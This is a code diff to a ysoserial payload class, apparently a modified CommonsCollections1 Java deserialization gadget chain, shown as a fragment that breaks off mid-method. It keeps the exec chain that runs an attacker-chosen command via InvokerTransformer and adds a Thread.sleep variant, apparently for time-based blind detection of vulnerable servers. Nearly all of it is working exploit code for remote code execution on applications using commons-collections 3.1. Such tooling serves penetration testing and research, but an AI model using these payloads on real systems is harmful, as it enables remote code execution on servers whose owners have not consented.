@@ -41,7 +41,7 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies({"commons-collections:commons-collections:3.1"})
 public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 	
-	public InvocationHandler getObject(final String command) throws Exception {
+	public InvocationHandler getObjectExec(final String command) throws Exception {
 		final String[] execArgs = new String[] { command };
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
@@ -58,6 +58,40 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 				new InvokerTransformer("exec",
 					new Class[] { String.class }, execArgs),
 				new ConstantTransformer(1) };
+
+		final Map innerMap = new HashMap();
+
+		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+		
+		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+		
+		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
+		
+		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
+				
+		return handler;
+	}	
+	
+	public InvocationHandler getObjectSleep(final String command) throws Exception {
+		//final long[] execArgs = new long[] { Long.parseLong(command)};
+		final Object[] execArgs = new Object[] {Long.parseLong(command)};
+		// inert chain for setup
+		final Transformer transformerChain = new ChainedTransformer(
+			new Transformer[]{ new ConstantTransformer(1) });
+		// real chain for after setup
+		final Transformer[] transformers = new Transformer[] {
+				new ConstantTransformer(java.lang.Thread.class),
+				new InvokerTransformer("getMethod", new Class[] {
+					String.class, Class[].class }, new Object[] {
+					"sleep", new Class[]{long.class} }),
+				new InvokerTransformer("invoke", new Class[] {
+					Object.class, Object[].class }, new Object[] {
+					new Class[] { long.class }, execArgs }),
+				//new InvokerTransformer("exec",
+				//	new Class[] { String.class }, execArgs),
+				new ConstantTransformer(1) };
+		
+		//TEESTs
 
 		final Map innerMap = new HashMap();
 
